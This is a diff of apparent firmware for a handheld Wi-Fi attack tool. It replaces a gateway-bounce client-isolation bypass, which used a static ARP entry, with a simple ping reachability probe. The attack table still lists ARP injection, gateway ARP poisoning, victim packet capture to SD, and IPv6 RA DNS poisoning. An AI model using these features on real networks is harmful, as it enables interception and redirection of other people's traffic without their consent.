@@ -55,7 +55,7 @@ enum IsoAttack {
 struct IsoAttackInfo { IsoAttack id; const char* key; const char* label; const char* desc; };
 static const IsoAttackInfo ISO_ATTACKS[] = {
     { ISO_INJECT,   "inject",   "Inject (GTK broadcast ARP)", "GTK-encrypt broadcast ARP → reachability probe" },
-    { ISO_BOUNCE,   "bounce",   "Gateway bounce",         "Reach victim via gateway (IP layer)" },
+    { ISO_BOUNCE,   "bounce",   "Reachability probe",     "Ping victim - reachable past isolation?" },
     { ISO_PORTUP,   "portup",   "Gateway poison (uplink)", "ARP-poison victim's gateway → redirect to us" },
     { ISO_PORTDOWN, "portdown", "Victim capture -> SD",   "Log victim's frames to /apps/isoscan pcap" },
     { ISO_RADNS,    "dns",      "RA DNS poison",          "ICMPv6 RA → point victim DNS at us, log queries" },
@@ -477,66 +477,34 @@ static void isoCapCb(void* buf, wifi_promiscuous_pkt_type_t t) {
     s_capHead = nx;
 }
 
-// ── gateway MAC resolver (bounce needs it; the gateway is reachable even under
-// isolation, so lwip can ARP it normally). Returns true + fills mac, or false.
-static bool isoResolveGw(uint32_t gwIp, struct eth_addr* mac) {
-    if (!netif_default || !gwIp) return false;
-    ip4_addr_t g; IP4_ADDR(&g, (gwIp >> 24) & 0xff, (gwIp >> 16) & 0xff, (gwIp >> 8) & 0xff, gwIp & 0xff);
-    for (int t = 0; t < 25; t++) {                   // ~2.5s
-        struct eth_addr* er = nullptr; const ip4_addr_t* ir = nullptr;
-        LOCK_TCPIP_CORE();
-        etharp_request(netif_default, &g);
-        s8_t hit = etharp_find_addr(netif_default, &g, &er, &ir);
-        UNLOCK_TCPIP_CORE();
-        if (hit >= 0 && er) { *mac = *er; return true; }
-        char k = inputHandler.getKeyboardInput();
-        if (k == 'q' || k == 'Q') return false;
-        vTaskDelay(pdMS_TO_TICKS(100));
-    }
-    return false;
-}
-
-// ── bounce — reach the victim at the IP layer via the gateway ────────────────────
-// Client isolation blocks client↔client at L2, but the gateway routes at L3. We
-// install a static ARP entry (victim IP → gateway MAC) so lwip sends the victim's
-// packets to the gateway, which may hairpin them to the victim. A ping reply =>
-// reachable despite isolation. Static entry removed on every exit.
+// ── bounce — IP-layer reachability probe ─────────────────────────────────────────
+// Ping the victim. lwip broadcasts an ARP for it; most "client isolation" only
+// blocks client↔client UNICAST (data), not the AP's broadcast ARP relay, so the
+// victim still answers and the ping gets through — reachable despite isolation.
+// (A true gateway-MAC bounce needs lwip static ARP entries, which this build
+// compiles out — ETHARP_SUPPORT_STATIC_ENTRIES off — so a plain ping is the
+// portable reachability test.)
 static void isoBounce(int idx) {
     auto& dm = displayManager;
-    isoHeader("gateway bounce");
+    isoHeader("reachability probe");
     uint32_t victimIp = netspyDeviceIp(idx);
     if (!victimIp) { dm.setTextColor(TFT_RED); dm.println("Victim has no IP."); dm.printCommandScreen(); return; }
-    IPAddress gw = WiFi.gatewayIP();
-    uint32_t gwIp = ((uint32_t)gw[0] << 24) | ((uint32_t)gw[1] << 16) | ((uint32_t)gw[2] << 8) | gw[3];
-    if (!gwIp) { dm.setTextColor(TFT_RED); dm.println("No gateway."); dm.printCommandScreen(); return; }
-
-    char b[48];
-    dm.setTextColor(0x7BEF); dm.println("Resolving gateway MAC...");
-    struct eth_addr gwMac;
-    if (!isoResolveGw(gwIp, &gwMac)) {
-        dm.setTextColor(TFT_RED); dm.println("Can't resolve gateway MAC."); dm.printCommandScreen(); return;
-    }
-    ip4_addr_t vip; IP4_ADDR(&vip, (victimIp >> 24) & 0xff, (victimIp >> 16) & 0xff,
-                            (victimIp >> 8) & 0xff, victimIp & 0xff);
-    LOCK_TCPIP_CORE(); etharp_add_static_entry(&vip, &gwMac); UNLOCK_TCPIP_CORE();
 
     IPAddress vAddr((uint8_t)((victimIp >> 24) & 0xff), (uint8_t)((victimIp >> 16) & 0xff),
                     (uint8_t)((victimIp >> 8) & 0xff), (uint8_t)(victimIp & 0xff));
-    isoIpStr(victimIp, b, sizeof(b));
-    dm.setTextColor(0x7BEF); dm.printText("Pinging "); dm.printText(b); dm.println(" via gw...");
+    char b[48]; isoIpStr(victimIp, b, sizeof(b));
+    dm.setTextColor(0x7BEF); dm.printText("Pinging "); dm.printText(b); dm.println(" ...");
     bool ok = Ping.ping(vAddr, 4);                   // blocks ~4s
     float ms = ok ? Ping.averageTime() : 0.0f;
-
-    LOCK_TCPIP_CORE(); etharp_remove_static_entry(&vip); UNLOCK_TCPIP_CORE();
 
     dm.println("");
     if (ok) {
         dm.setTextColor(TFT_GREEN);
-        snprintf(b, sizeof(b), "BOUNCE OK - reply %.0f ms", ms); dm.println(b);
-        dm.setTextColor(0x6FE8); dm.println("Isolation bypassed at IP layer.");
+        snprintf(b, sizeof(b), "REACHABLE - reply %.0f ms", ms); dm.println(b);
+        dm.setTextColor(0x6FE8); dm.println("Victim answers at IP layer.");
     } else {
-        dm.setTextColor(TFT_RED); dm.println("No reply - bounce blocked");
-        dm.setTextColor(0x7BEF); dm.println("(gateway won't hairpin, or victim");
+        dm.setTextColor(TFT_RED); dm.println("No reply - blocked/filtered");
+        dm.setTextColor(0x7BEF); dm.println("(strict isolation, or victim");
         dm.println(" drops ICMP)");
     }
     dm.printCommandScreen();
